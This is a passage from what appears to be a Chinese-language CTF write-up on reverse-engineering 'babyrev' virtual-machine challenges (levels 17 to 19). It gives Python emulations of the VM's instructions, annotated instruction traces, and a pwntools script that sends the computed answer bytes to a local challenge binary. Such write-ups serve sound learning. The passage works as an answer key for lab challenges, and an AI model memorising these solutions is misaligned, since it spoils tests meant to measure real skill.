class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a1 = np.zeros((<span class="hljs-number">512</span>,<span class="hljs-number">1</span>), dtype=<span class="hljs-built_in">int</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">imm</span>(<span class="hljs-params">a2,a3</span>):<br>    <span class="hljs-keyword">return</span> sub_1415(a2,a3)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stm</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = read_register(a3)<br>    v4 = read_register(a2)<br>    <span class="hljs-keyword">return</span> write_memory(v4, v3)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_memory</span>(<span class="hljs-params">a2, a3</span>):<br>    res = a2<br>    a1[a2] = a3<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = sub_1363(a2)<br>    v4 = sub_1363(a3)<br>    <span class="hljs-keyword">return</span> sub_1415(a2, v3+v4)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_register</span>(<span class="hljs-params">a2</span>):<br>    <span class="hljs-keyword">match</span> a2:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">257</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">256</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">261</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">259</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">260</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">258</span>]<br>    <span class="hljs-keyword">return</span> a1[<span class="hljs-number">262</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_register</span>(<span class="hljs-params">a2, a3</span>):             <span class="hljs-comment"># sub_13F5</span><br>    <span class="hljs-keyword">match</span> a2:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            a1[<span class="hljs-number">257</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            a1[<span class="hljs-number">256</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            a1[<span class="hljs-number">262</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            a1[<span class="hljs-number">261</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            a1[<span class="hljs-number">259</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            a1[<span class="hljs-number">260</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            a1[<span class="hljs-number">258</span>] = a3<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ldm</span>(<span class="hljs-params">a2, a3</span>):<br>    v5 = read_register(a3)<br>    memory = read_memory(v5)<br>    <span class="hljs-keyword">return</span> write_register(a2, memory)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_memory</span>(<span class="hljs-params">a2</span>):<br>    <span class="hljs-keyword">return</span> a1[a2]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">imm</span>(<span class="hljs-params">a2, a3</span>):<br>    <span class="hljs-keyword">return</span> write_register(a2, a3)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_memory</span>(<span class="hljs-params">a2, a3</span>):<br>    a1[a2] = a3<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stm</span>(<span class="hljs-params">a2, a3</span>):                    <span class="hljs-comment"># stm</span><br>    v3 = read_register(a3)          <span class="hljs-comment"># </span><br>    v5 = read_register(a2)          <span class="hljs-comment"># </span><br>    <span class="hljs-keyword">return</span> write_memory(v5, v3)     <span class="hljs-comment"># </span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = read_register(a2)<br>    v5 = read_register(a3)<br>    <span class="hljs-keyword">return</span> write_register(a2, v3+v5)<br><br></code></pre></td></tr></table></figure><p>ida打开，同样的有<code>LDM</code>指令，不过符号没有标识出来而已。然后发现它是在它原先的字符串上进行了加法，而不是上一题那样在我们输入的字符串上进行加法。那就很简单了。只需要把最后的值打印出来，然后大于256的减一下就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyrev-level-17-1&#x27;</span>)<br>al = [<span class="hljs-number">188</span>, <span class="hljs-number">371</span>, <span class="hljs-number">259</span>, <span class="hljs-number">201</span>,<span class="hljs-number">273</span>,<span class="hljs-number">381</span>, <span class="hljs-number">204</span>, <span class="hljs-number">259</span>,<span class="hljs-number">313</span>, <span class="hljs-number">219</span>, <span class="hljs-number">235</span>,<span class="hljs-number">411</span>]<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(al)):<br>    <span class="hljs-keyword">if</span> al[i] &gt; <span class="hljs-number">256</span>:<br>        payload += struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, al[i] - <span class="hljs-number">256</span>)<br>    <span class="hljs-keyword">else</span>:<br>        payload += struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, al[i])<br><span class="hljs-comment"># payload = struct.pack(&#x27;6b&#x27;, *al)</span><br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.readall())<br><br></code></pre></td></tr></table></figure><h4 id="level18-0"><a href="#level18-0" class="headerlink" title="level18.0"></a>level18.0</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs armasm">[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x6d</span><br>[s] IMM c = <span class="hljs-number">0x1</span><br>[s] IMM a = <span class="hljs-number">0x81</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xea</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0x34</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xde</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xf2</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0x1d</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xe</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0x49</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xe1</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x6d</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span># <span class="hljs-keyword">b</span> = <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x6d</span>] = <span class="hljs-number">0x81</span><br>[s] IMM a = <span class="hljs-number">0x4d</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a# a = <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x4d</span>]users input from <span class="hljs-number">0x4d</span><br>[s] IMM c = <span class="hljs-number">0x2e</span><br>[s] <span class="hljs-keyword">ADD</span> a c# a = <span class="hljs-number">0x2e</span><br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span># <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x6d</span>], <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x4d</span>] + <span class="hljs-number">0x2e</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x6e</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x4e</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0xa7</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x6f</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x4f</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0x9e</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x70</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x50</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0x82</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x71</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x51</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0x9d</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x72</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x52</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0x89</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x73</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x53</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0xdc</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x74</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x54</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0x7</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x75</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x55</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0xa9</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a b<br></code></pre></td></tr></table></figure><p>其他的不怎么用改，只不过在这里需要自己加变量，然后打印出来中间的输入。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs routeros">imm(0x20, 0x4D)<br>imm(0x40, 9)<br>imm(2, 0)<br><span class="hljs-comment"># sys(2, 2)</span><br>imm(0x20, 0x6D)             # 0x20 b<br>imm(0x40, 1)                # 0x40 c<br>imm(2, 0x81)                # 0x02 a        0x10 d      0x01 s      0x04 i      0x08 f<br>stm(0x20, 2)                # [s] STM <span class="hljs-number">*b</span> = a<br><span class="hljs-built_in">add</span>(0x20, 0x40)             # [s] <span class="hljs-built_in">ADD</span> b c<br>imm(2, 0xEA)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0x34)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0xDE)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0xF2)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0x1D)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0xE)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0x49)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0xE1)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)         # [s] <span class="hljs-built_in">ADD</span> b c<br>imm(0x20, 0x6D)         # [s] IMM b = 0x6d<br>ldm(32, 32)             # [s] LDM b = <span class="hljs-number">*b</span><br>imm(2, 0x4D)            # [s] IMM a = 0x4d<br>ldm(2, 2)               # [s] IMM a = <span class="hljs-number">*a</span><br>imm(0x40, 0x2E)         # [s] IMM c = 0x2e<br><span class="hljs-built_in">add</span>(2, 0x40)            # [s] <span class="hljs-built_in">add</span> a c                        <br>imm(0x10, 1)            # [s] IMM d = 0x01<br>imm(1, 0x4D)            # [s] IMM s = 0x4d<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br>imm(0x20, 0x6E)<br>ldm(32, 32)<br>imm(2, 0x4E)<br>ldm(2, 2)<br>imm(0x40, 0xA7)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br>imm(0x20, 0x6F)<br>ldm(32, 32)<br>imm(2, 0x4F)<br>ldm(2, 2)<br>imm(0x40, 0x9E)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br>imm(0x20, 0x70)<br>ldm(32, 32)<br>imm(2, 0x50)<br>ldm(2, 2)<br>imm(0x40, 0x82)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br><span class="hljs-comment"># cmp(2, 32)</span><br>imm(0x20, 0x71)<br>ldm(32, 32)<br>imm(2, 0x51)<br>ldm(2, 2)<br>imm(0x40, 0x9D)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br><span class="hljs-comment"># cmp(2, 32)</span><br>imm(0x20, 0x72)<br>ldm(32, 32)<br>imm(2, 0x52)<br>ldm(2, 2)<br>imm(0x40, 0x89)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br><span class="hljs-comment"># cmp(2, 32)</span><br>imm(0x20, 0x73)<br>ldm(32, 32)<br>imm(2, 0x53)<br>ldm(2, 2)<br>imm(0x40, 0xDC)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br><span class="hljs-comment"># cmp(2, 32)</span><br>imm(0x20, 0x74)<br>ldm(32, 32)<br>imm(2, 0x54)<br>ldm(2, 2)<br>imm(0x40, 7)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br><span class="hljs-comment"># cmp(2, 32)</span><br>imm(0x20, 0x75)<br>ldm(32, 32)<br>imm(2, 0x55)<br>ldm(2, 2)<br>imm(0x40, 0xA9)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br><span class="hljs-comment"># cmp(2, 32)</span><br><span class="hljs-built_in">print</span>(a1[0x6d: 0x6d + 9])<br><span class="hljs-built_in">print</span>(a1[0x4d: 0x4d + 9])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(9):<br>    a1[i] = a1[0x6d + i] - a1[0x4d + i]<br><span class="hljs-built_in">print</span>(a1[:9])<br></code></pre></td></tr></table></figure><p>根据描述可以知道寄存器a，b，c，d，s，i，f分别是哪些16进制数代表的。所以就可以用上去，把中间值存起来，最后做一个减法就行了。</p><p>最后记得一点，就是有一个小于-128的负数，我们加上256，而不是加128。因为原本的数是因为大于256才溢出成为负数的。那么同理，减法也是减去256而不是128。</p><h4 id="level18-1"><a href="#level18-1" class="headerlink" title="level18.1"></a>level18.1</h4><p>从<code>a1[121]</code>接收用户输入，目标字符串在<code>a1[153]</code>；从逻辑上很容易看出来，这道题是在目标字符串上加了一个数。所以，这里我们需要修改上题的逻辑，把加之后的数据依然保存在原来的<code>a1[153]</code>开始的连续地址处就行了。最后再打印出来，转成字节序发送即可。</p><h4 id="level19-0"><a href="#level19-0" class="headerlink" title="level19.0"></a>level19.0</h4><p>原来，这里才开始是vmcode啊。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span 